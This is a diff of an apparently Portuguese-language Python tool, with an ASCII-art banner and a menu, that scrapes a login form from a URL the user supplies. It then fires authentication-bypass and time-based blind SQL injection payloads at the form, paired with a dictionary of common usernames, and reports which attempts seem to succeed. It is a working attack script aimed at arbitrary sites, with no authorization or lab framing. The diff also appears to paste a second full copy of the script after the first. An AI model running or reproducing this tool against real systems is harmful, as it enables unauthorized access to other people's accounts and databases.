@@ -1,9 +1,9 @@
 import requests
-import time
-from datetime import datetime
 from bs4 import BeautifulSoup
+import time
+import re
 
-# Payloads padrão e "blind"
+# Lista de payloads para SQL Injection (incluindo blind)
 payloads = [
     "' OR '1'='1",
     "' OR 1=1--",
@@ -13,13 +13,16 @@ payloads = [
     "admin' --",
     "' OR '1'='1' /*",
     "' OR sleep(5)--",
-    "' OR SLEEP(5)#",
-    "' OR 1=1 AND SLEEP(5)--",
-    "' OR IF(1=1,SLEEP(5),0)--",
-    "' OR IF(1=1,SLEEP(5),0)#",
-    "admin' AND SLEEP(5)--",
-    "\" OR SLEEP(5)#",
+    "' OR SLEEP(5) --",
+    "\" OR \"\"=\"",
     "' OR ''='",
+]
+
+# Dicionário de nomes de usuário comuns
+usernames = [
+    "admin", "root", "user", "test", "guest",
+    "admin1", "usuario", "login", "adm", "admin123",
+    "test1", "user1", "manager", "owner", "support"
 ]
 
 def blue_text(text):
@@ -42,10 +45,8 @@ def extract_form_fields(html):
     for input_tag in inputs:
         name = input_tag.get('name')
         input_type = input_tag.get('type', 'text')
-
         if not name:
             continue
-
         if input_type in ['text', 'email'] and not user_field:
             user_field = name
         elif input_type == 'password' and not pass_field:
@@ -54,15 +55,7 @@ def extract_form_fields(html):
 
     return action, method, fields, user_field, pass_field
 
-def confirm_successful_login(response, login_url):
-    soup = BeautifulSoup(response.text, 'html.parser')
-    title = soup.title.string.strip() if soup.title else ""
-    keywords = ['logout', 'painel', 'admin', 'dashboard', 'sair']
-    if response.url != login_url or any(k in response.text.lower() for k in keywords):
-        return True, title
-    return False, title
-
-def test_sql_injection(url, usernames):
+def test_sql_injection(url):
     session = requests.Session()
     print(blue_text("[-] Acessando página de login..."))
     resp = session.get(url)
@@ -74,12 +67,6 @@ def test_sql_injection(url, usernames):
 
     login_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
     working_payloads = []
-
-    # Criação do arquivo de relatório
-    report_filename = f"relatorio_sqlinj_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-    with open(report_filename, 'w', encoding='utf-8') as report:
-        report.write(f"Relatório de Teste - {datetime.now()}\n")
-        report.write(f"URL de login: {url}\n\n")
 
     print(f"\n{blue_text('[*] Testando payloads...')}")
 
@@ -97,35 +84,54 @@ def test_sql_injection(url, usernames):
                 else:
                     response = session.get(login_url, params=data)
 
-                elapsed = time.time() - start_time
+                duration = time.time() - start_time
+                tempo = f"{duration:.2f}s"
+                resposta = response.text.lower()
 
-                with open(report_filename, 'a', encoding='utf-8') as report:
-                    report.write(f"Usuário: {username} | Payload: {payload} | Tempo: {elapsed:.2f}s\n")
+                sucesso = False
+                blind = False
+                erro_sql = False
+                waf = False
 
-                    # Detecção de CAPTCHA ou WAF
-                    if 'captcha' in response.text.lower() or 'verifique' in response.text.lower():
-                        report.write("→ ⚠️ CAPTCHA detectado na resposta!\n")
+                if any(kw in resposta for kw in ['bem-vindo', 'logout', 'painel', 'admin']):
+                    sucesso = True
+                elif response.url != login_url:
+                    sucesso = True
+                elif any(e in resposta for e in ['sql', 'syntax', 'mysql', 'warning', 'error']):
+                    erro_sql = True
+                elif duration >= 4.0:
+                    blind = True
+                elif any(w in resposta for w in ['captcha', 'access denied', 'waf', 'verifique']):
+                    waf = True
 
-                    if response.status_code == 403:
-                        report.write("→ ❌ Acesso negado (403) - possível WAF\n")
+                print(blue_text(f"Usuário: {username} | Payload: {payload} | Tempo: {tempo}"))
 
-                    if 'waf' in response.text.lower() or 'access denied' in response.text.lower():
-                        report.write("→ 🚨 WAF suspeito detectado!\n")
+                if sucesso:
+                    print(blue_text("→ ✅ Login possivelmente bem-sucedido!"))
+                elif erro_sql:
+                    print(blue_text("→ ⚠️ Erro SQL detectado"))
+                elif blind:
+                    print(blue_text("→ ⚠️ Resposta lenta: possível SQL Injection blind"))
+                elif waf:
+                    print(blue_text("→ 🚨 WAF suspeito detectado!"))
+                else:
+                    print(blue_text("→ - Sem resposta suspeita"))
 
-                    if logged_in := confirm_successful_login(response, login_url)[0]:
-                        report.write("→ ✅ Login bem-sucedido!\n\n")
-                    elif elapsed > 4:
-                        report.write("→ ⚠️ Resposta lenta - possível SQLi blind\n\n")
-                    else:
-                        report.write("→ - Sem resposta suspeita\n\n")
+                if sucesso or erro_sql or blind:
+                    working_payloads.append((username, payload, tempo))
 
             except Exception as e:
                 print(blue_text(f"[!] Erro com payload {payload} para o usuário {username}: {e}"))
 
     print(blue_text("\n[✓] Testes finalizados."))
-    print(blue_text(f"[+] Relatório salvo em: {report_filename}"))
+    if working_payloads:
+        print(blue_text("\n[+] Payloads que deram resposta suspeita:"))
+        for u, p, t in working_payloads:
+            print(blue_text(f" - Usuário: {u} | Payload: {p} | Tempo: {t}"))
+    else:
+        print(blue_text("[-] Nenhuma falha aparente detectada."))
 
-def menu():
+def main():
     print(blue_text("""
   /$$$$$$            /$$
  /$$__  $$          | $$
@@ -143,26 +149,175 @@ def menu():
     print(blue_text("1. Testar SQL Injection em login"))
     print(blue_text("2. Sair"))
 
-def main():
     while True:
-        menu()
         choice = input(blue_text("Escolha uma opção: ")).strip()
-
         if choice == "1":
             url = input(blue_text("Insira a URL da página de login: ")).strip()
-            usernames_input = input(blue_text("Insira os nomes de usuário separados por vírgula (ou pressione Enter para usar dicionário): ")).strip()
+            test_sql_injection(url)
+        elif choice == "2":
+            print(blue_text("Saindo..."))
+            break
+        else:
+            print(blue_text("[!] Opção inválida. Tente novamente."))
 
-            if not usernames_input.strip():
-                print(blue_text("[*] Nenhum usuário informado, usando dicionário padrão..."))
-                usernames = [
-                    "admin", "administrator", "root", "user", "guest", "test",
-                    "admin123", "user1", "demo", "login", "john", "maria", "admin1"
-                ]
-            else:
-                usernames = [u.strip() for u in usernames_input.split(",")]
+if __name__ == '__main__':
+    main()
+import requests
+from bs4 import BeautifulSoup
+import time
+import re
 
-            test_sql_injection(url, usernames)
+# Lista de payloads para SQL Injection (incluindo blind)
+payloads = [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR '1'='1' --",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "admin' --",
+    "' OR '1'='1' /*",
+    "' OR sleep(5)--",
+    "' OR SLEEP(5) --",
+    "\" OR \"\"=\"",
+    "' OR ''='",
+]
 
+# Dicionário de nomes de usuário comuns
+usernames = [
+    "admin", "root", "user", "test", "guest",
+    "admin1", "usuario", "login", "adm", "admin123",
+    "test1", "user1", "manager", "owner", "support"
+]
+
+def blue_text(text):
+    return f"\033[34m{text}\033[0m"
+
+def extract_form_fields(html):
+    soup = BeautifulSoup(html, 'html.parser')
+    form = soup.find('form')
+    if not form:
+        print(blue_text("[!] Nenhum formulário encontrado."))
+        return None, None, None, None, None
+
+    action = form.get('action')
+    method = form.get('method', 'post').lower()
+    inputs = form.find_all('input')
+    fields = {}
+    user_field = None
+    pass_field = None
+
+    for input_tag in inputs:
+        name = input_tag.get('name')
+        input_type = input_tag.get('type', 'text')
+        if not name:
+            continue
+        if input_type in ['text', 'email'] and not user_field:
+            user_field = name
+        elif input_type == 'password' and not pass_field:
+            pass_field = name
+        fields[name] = ''
+
+    return action, method, fields, user_field, pass_field
+
+def test_sql_injection(url):
+    session = requests.Session()
+    print(blue_text("[-] Acessando página de login..."))
+    resp = session.get(url)
+    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)
+
+    if not all([action, user_field, pass_field]):
+        print(blue_text("[!] Não foi possível identificar os campos do formulário."))
+        return
+
+    login_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
+    working_payloads = []
+
+    print(f"\n{blue_text('[*] Testando payloads...')}")
+
+    for username in usernames:
+        for payload in payloads:
+            data = fields.copy()
+            data[user_field] = username
+            data[pass_field] = payload
+
+            try:
+                start_time = time.time()
+
+                if method == 'post':
+                    response = session.post(login_url, data=data)
+                else:
+                    response = session.get(login_url, params=data)
+
+                duration = time.time() - start_time
+                tempo = f"{duration:.2f}s"
+                resposta = response.text.lower()
+
+                sucesso = False
+                blind = False
+                erro_sql = False
+                waf = False
+
+                if any(kw in resposta for kw in ['bem-vindo', 'logout', 'painel', 'admin']):
+                    sucesso = True
+                elif response.url != login_url:
+                    sucesso = True
+                elif any(e in resposta for e in ['sql', 'syntax', 'mysql', 'warning', 'error']):
+                    erro_sql = True
+                elif duration >= 4.0:
+                    blind = True
+                elif any(w in resposta for w in ['captcha', 'access denied', 'waf', 'verifique']):
+                    waf = True
+
+                print(blue_text(f"Usuário: {username} | Payload: {payload} | Tempo: {tempo}"))
+
+                if sucesso:
+                    print(blue_text("→ ✅ Login possivelmente bem-sucedido!"))
+                elif erro_sql:
+                    print(blue_text("→ ⚠️ Erro SQL detectado"))
+                elif blind:
+                    print(blue_text("→ ⚠️ Resposta lenta: possível SQL Injection blind"))
+                elif waf:
+                    print(blue_text("→ 🚨 WAF suspeito detectado!"))
+                else:
+                    print(blue_text("→ - Sem resposta suspeita"))
+
+                if sucesso or erro_sql or blind:
+                    working_payloads.append((username, payload, tempo))
+
+            except Exception as e:
+                print(blue_text(f"[!] Erro com payload {payload} para o usuário {username}: {e}"))
+
+    print(blue_text("\n[✓] Testes finalizados."))
+    if working_payloads:
+        print(blue_text("\n[+] Payloads que deram resposta suspeita:"))
+        for u, p, t in working_payloads:
+            print(blue_text(f" - Usuário: {u} | Payload: {p} | Tempo: {t}"))
+    else:
+        print(blue_text("[-] Nenhuma falha aparente detectada."))
+
+def main():
+    print(blue_text("""
+  /$$$$$$            /$$
+ /$$__  $$          | $$
+| $$  \__/  /$$$$$$ | $$
+|  $$$$$$  /$$__  $$| $$
+ \____  $$| $$  \ $$| $$
+ /$$  \ $$| $$  | $$| $$
+|  $$$$$$/|  $$$$$$$| $$
+ \______/  \____  $$|__/
+               | $$    
+               | $$    
+               |__/    
+    """))
+
+    print(blue_text("1. Testar SQL Injection em login"))
+    print(blue_text("2. Sair"))
+
+    while True:
+        choice = input(blue_text("Escolha uma opção: ")).strip()
+        if choice == "1":
+            url = input(blue_text("Insira a URL da página de login: ")).strip()
+            test_sql_injection(url)
         elif choice == "2":
             print(blue_text("Saindo..."))
             break
